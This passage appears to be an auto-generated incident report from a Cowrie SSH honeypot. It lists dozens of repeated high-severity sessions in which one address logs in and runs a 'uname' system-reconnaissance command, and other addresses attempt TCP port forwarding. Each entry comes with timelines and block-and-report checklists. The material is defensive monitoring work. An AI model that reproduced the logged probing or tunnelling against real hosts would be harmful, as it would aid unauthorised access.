| `2026-07-24 15:00:22` | `cowrie.client.version` |
| `2026-07-24 15:00:22` | `cowrie.client.kex` |
| `2026-07-24 15:00:23` | `cowrie.login.success` |
| `2026-07-24 15:00:23` | `cowrie.session.params` |
| `2026-07-24 15:00:23` | `cowrie.command.input` |
| `2026-07-24 15:00:23` | `cowrie.log.closed` |
| `2026-07-24 15:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b8ff2ea60fd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:00 |
| **Last Seen** | 2026-07-24 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:00:29` | `cowrie.session.connect` |
| `2026-07-24 15:00:29` | `cowrie.client.version` |
| `2026-07-24 15:00:29` | `cowrie.client.kex` |
| `2026-07-24 15:00:29` | `cowrie.login.success` |
| `2026-07-24 15:00:30` | `cowrie.session.params` |
| `2026-07-24 15:00:30` | `cowrie.command.input` |
| `2026-07-24 15:00:30` | `cowrie.log.closed` |
| `2026-07-24 15:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7875a36453b2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:00 |
| **Last Seen** | 2026-07-24 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:00:36` | `cowrie.session.connect` |
| `2026-07-24 15:00:36` | `cowrie.client.version` |
| `2026-07-24 15:00:36` | `cowrie.client.kex` |
| `2026-07-24 15:00:36` | `cowrie.login.success` |
| `2026-07-24 15:00:37` | `cowrie.session.params` |
| `2026-07-24 15:00:37` | `cowrie.command.input` |
| `2026-07-24 15:00:38` | `cowrie.log.closed` |
| `2026-07-24 15:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-263ca2ec172d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:00 |
| **Last Seen** | 2026-07-24 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:00:42` | `cowrie.session.connect` |
| `2026-07-24 15:00:42` | `cowrie.client.version` |
| `2026-07-24 15:00:42` | `cowrie.client.kex` |
| `2026-07-24 15:00:43` | `cowrie.login.success` |
| `2026-07-24 15:00:44` | `cowrie.session.params` |
| `2026-07-24 15:00:44` | `cowrie.command.input` |
| `2026-07-24 15:00:44` | `cowrie.log.closed` |
| `2026-07-24 15:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52973bd5a3ff

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:00 |
| **Last Seen** | 2026-07-24 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:00:49` | `cowrie.session.connect` |
| `2026-07-24 15:00:49` | `cowrie.client.version` |
| `2026-07-24 15:00:49` | `cowrie.client.kex` |
| `2026-07-24 15:00:50` | `cowrie.login.success` |
| `2026-07-24 15:00:51` | `cowrie.session.params` |
| `2026-07-24 15:00:51` | `cowrie.command.input` |
| `2026-07-24 15:00:51` | `cowrie.log.closed` |
| `2026-07-24 15:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bea8859708ae

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:00 |
| **Last Seen** | 2026-07-24 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:00:56` | `cowrie.session.connect` |
| `2026-07-24 15:00:56` | `cowrie.client.version` |
| `2026-07-24 15:00:57` | `cowrie.client.kex` |
| `2026-07-24 15:00:57` | `cowrie.login.success` |
| `2026-07-24 15:00:58` | `cowrie.session.params` |
| `2026-07-24 15:00:58` | `cowrie.command.input` |
| `2026-07-24 15:00:58` | `cowrie.log.closed` |
| `2026-07-24 15:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91f48b4517bf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:01 |
| **Last Seen** | 2026-07-24 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:01:03` | `cowrie.session.connect` |
| `2026-07-24 15:01:03` | `cowrie.client.version` |
| `2026-07-24 15:01:04` | `cowrie.client.kex` |
| `2026-07-24 15:01:04` | `cowrie.login.success` |
| `2026-07-24 15:01:05` | `cowrie.session.params` |
| `2026-07-24 15:01:05` | `cowrie.command.input` |
| `2026-07-24 15:01:05` | `cowrie.log.closed` |
| `2026-07-24 15:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de71a670b00e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:01 |
| **Last Seen** | 2026-07-24 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:01:11` | `cowrie.session.connect` |
| `2026-07-24 15:01:11` | `cowrie.client.version` |
| `2026-07-24 15:01:11` | `cowrie.client.kex` |
| `2026-07-24 15:01:11` | `cowrie.login.success` |
| `2026-07-24 15:01:12` | `cowrie.session.params` |
| `2026-07-24 15:01:12` | `cowrie.command.input` |
| `2026-07-24 15:01:13` | `cowrie.log.closed` |
| `2026-07-24 15:01:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ecefa79825c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:01 |
| **Last Seen** | 2026-07-24 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:01:18` | `cowrie.session.connect` |
| `2026-07-24 15:01:18` | `cowrie.client.version` |
| `2026-07-24 15:01:18` | `cowrie.client.kex` |
| `2026-07-24 15:01:18` | `cowrie.login.success` |
| `2026-07-24 15:01:19` | `cowrie.session.params` |
| `2026-07-24 15:01:19` | `cowrie.command.input` |
| `2026-07-24 15:01:19` | `cowrie.log.closed` |
| `2026-07-24 15:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28bcea6ee80f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:01 |
| **Last Seen** | 2026-07-24 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:01:25` | `cowrie.session.connect` |
| `2026-07-24 15:01:25` | `cowrie.client.version` |
| `2026-07-24 15:01:25` | `cowrie.client.kex` |
| `2026-07-24 15:01:25` | `cowrie.login.success` |
| `2026-07-24 15:01:26` | `cowrie.session.params` |
| `2026-07-24 15:01:26` | `cowrie.command.input` |
| `2026-07-24 15:01:26` | `cowrie.log.closed` |
| `2026-07-24 15:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44f5477c99bd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:01 |
| **Last Seen** | 2026-07-24 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:01:32` | `cowrie.session.connect` |
| `2026-07-24 15:01:32` | `cowrie.client.version` |
| `2026-07-24 15:01:32` | `cowrie.client.kex` |
| `2026-07-24 15:01:33` | `cowrie.login.success` |
| `2026-07-24 15:01:33` | `cowrie.session.params` |
| `2026-07-24 15:01:33` | `cowrie.command.input` |
| `2026-07-24 15:01:33` | `cowrie.log.closed` |
| `2026-07-24 15:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-866713fd71ac

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:01 |
| **Last Seen** | 2026-07-24 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:01:39` | `cowrie.session.connect` |
| `2026-07-24 15:01:39` | `cowrie.client.version` |
| `2026-07-24 15:01:39` | `cowrie.client.kex` |
| `2026-07-24 15:01:39` | `cowrie.login.success` |
| `2026-07-24 15:01:40` | `cowrie.session.params` |
| `2026-07-24 15:01:40` | `cowrie.command.input` |
| `2026-07-24 15:01:40` | `cowrie.log.closed` |
| `2026-07-24 15:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf4cc3ae1bdf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:01 |
| **Last Seen** | 2026-07-24 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:01:46` | `cowrie.session.connect` |
| `2026-07-24 15:01:46` | `cowrie.client.version` |
| `2026-07-24 15:01:46` | `cowrie.client.kex` |
| `2026-07-24 15:01:47` | `cowrie.login.success` |
| `2026-07-24 15:01:47` | `cowrie.session.params` |
| `2026-07-24 15:01:47` | `cowrie.command.input` |
| `2026-07-24 15:01:47` | `cowrie.log.closed` |
| `2026-07-24 15:01:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0838876b2bd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:01 |
| **Last Seen** | 2026-07-24 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:01:53` | `cowrie.session.connect` |
| `2026-07-24 15:01:53` | `cowrie.client.version` |
| `2026-07-24 15:01:53` | `cowrie.client.kex` |
| `2026-07-24 15:01:53` | `cowrie.login.success` |
| `2026-07-24 15:01:54` | `cowrie.session.params` |
| `2026-07-24 15:01:54` | `cowrie.command.input` |
| `2026-07-24 15:01:54` | `cowrie.log.closed` |
| `2026-07-24 15:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8886d8acdd5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:00` | `cowrie.session.connect` |
| `2026-07-24 15:02:00` | `cowrie.client.version` |
| `2026-07-24 15:02:00` | `cowrie.client.kex` |
| `2026-07-24 15:02:00` | `cowrie.login.success` |
| `2026-07-24 15:02:01` | `cowrie.session.params` |
| `2026-07-24 15:02:01` | `cowrie.command.input` |
| `2026-07-24 15:02:01` | `cowrie.log.closed` |
| `2026-07-24 15:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40976e704c48

| Field | Detail |
|---|---|
| **Source IP** | `123.129.245[.]249` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:03` | `cowrie.session.connect` |
| `2026-07-24 15:02:04` | `cowrie.client.version` |
| `2026-07-24 15:02:04` | `cowrie.client.kex` |
| `2026-07-24 15:02:06` | `cowrie.login.success` |
| `2026-07-24 15:02:07` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:02:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.129.245[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.129.245[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ada65369a04

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:07` | `cowrie.session.connect` |
| `2026-07-24 15:02:07` | `cowrie.client.version` |
| `2026-07-24 15:02:07` | `cowrie.client.kex` |
| `2026-07-24 15:02:07` | `cowrie.login.success` |
| `2026-07-24 15:02:08` | `cowrie.session.params` |
| `2026-07-24 15:02:08` | `cowrie.command.input` |
| `2026-07-24 15:02:08` | `cowrie.log.closed` |
| `2026-07-24 15:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3136659f3d8

| Field | Detail |
|---|---|
| **Source IP** | `65.20.153[.]146` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:12` | `cowrie.session.connect` |
| `2026-07-24 15:02:12` | `cowrie.client.version` |
| `2026-07-24 15:02:12` | `cowrie.client.kex` |
| `2026-07-24 15:02:14` | `cowrie.login.success` |
| `2026-07-24 15:02:14` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.153[.]146` to AbuseIPDB if not already reported
- [ ] Block `65.20.153[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-971ec5ffb827

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:13` | `cowrie.session.connect` |
| `2026-07-24 15:02:13` | `cowrie.client.version` |
| `2026-07-24 15:02:13` | `cowrie.client.kex` |
| `2026-07-24 15:02:14` | `cowrie.login.success` |
| `2026-07-24 15:02:15` | `cowrie.session.params` |
| `2026-07-24 15:02:15` | `cowrie.command.input` |
| `2026-07-24 15:02:15` | `cowrie.log.closed` |
| `2026-07-24 15:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5950994cc6b6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:20` | `cowrie.session.connect` |
| `2026-07-24 15:02:21` | `cowrie.client.version` |
| `2026-07-24 15:02:21` | `cowrie.client.kex` |
| `2026-07-24 15:02:21` | `cowrie.login.success` |
| `2026-07-24 15:02:22` | `cowrie.session.params` |
| `2026-07-24 15:02:22` | `cowrie.command.input` |
| `2026-07-24 15:02:22` | `cowrie.log.closed` |
| `2026-07-24 15:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8ea63be2d2f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:28` | `cowrie.session.connect` |
| `2026-07-24 15:02:28` | `cowrie.client.version` |
| `2026-07-24 15:02:28` | `cowrie.client.kex` |
| `2026-07-24 15:02:28` | `cowrie.login.success` |
| `2026-07-24 15:02:29` | `cowrie.session.params` |
| `2026-07-24 15:02:29` | `cowrie.command.input` |
| `2026-07-24 15:02:29` | `cowrie.log.closed` |
| `2026-07-24 15:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ace2d3d1f04d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:35` | `cowrie.session.connect` |
| `2026-07-24 15:02:35` | `cowrie.client.version` |
| `2026-07-24 15:02:35` | `cowrie.client.kex` |
| `2026-07-24 15:02:35` | `cowrie.login.success` |
| `2026-07-24 15:02:36` | `cowrie.session.params` |
| `2026-07-24 15:02:36` | `cowrie.command.input` |
| `2026-07-24 15:02:36` | `cowrie.log.closed` |
| `2026-07-24 15:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f82b80b2c9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:42` | `cowrie.session.connect` |
| `2026-07-24 15:02:42` | `cowrie.client.version` |
| `2026-07-24 15:02:42` | `cowrie.client.kex` |
| `2026-07-24 15:02:42` | `cowrie.login.success` |
| `2026-07-24 15:02:43` | `cowrie.session.params` |
| `2026-07-24 15:02:43` | `cowrie.command.input` |
| `2026-07-24 15:02:43` | `cowrie.log.closed` |
| `2026-07-24 15:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd75c2009ef5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:48` | `cowrie.session.connect` |
| `2026-07-24 15:02:48` | `cowrie.client.version` |
| `2026-07-24 15:02:48` | `cowrie.client.kex` |
| `2026-07-24 15:02:49` | `cowrie.login.success` |
| `2026-07-24 15:02:50` | `cowrie.session.params` |
| `2026-07-24 15:02:50` | `cowrie.command.input` |
| `2026-07-24 15:02:50` | `cowrie.log.closed` |
| `2026-07-24 15:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f56e1b94635f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:02 |
| **Last Seen** | 2026-07-24 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:02:55` | `cowrie.session.connect` |
| `2026-07-24 15:02:55` | `cowrie.client.version` |
| `2026-07-24 15:02:56` | `cowrie.client.kex` |
| `2026-07-24 15:02:56` | `cowrie.login.success` |
| `2026-07-24 15:02:57` | `cowrie.session.params` |
| `2026-07-24 15:02:57` | `cowrie.command.input` |
| `2026-07-24 15:02:57` | `cowrie.log.closed` |
| `2026-07-24 15:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a91ea9d8c88

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:03 |
| **Last Seen** | 2026-07-24 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:03:02` | `cowrie.session.connect` |
| `2026-07-24 15:03:02` | `cowrie.client.version` |
| `2026-07-24 15:03:02` | `cowrie.client.kex` |
| `2026-07-24 15:03:03` | `cowrie.login.success` |
| `2026-07-24 15:03:04` | `cowrie.session.params` |
| `2026-07-24 15:03:04` | `cowrie.command.input` |
| `2026-07-24 15:03:04` | `cowrie.log.closed` |
| `2026-07-24 15:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-434bc4138adf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
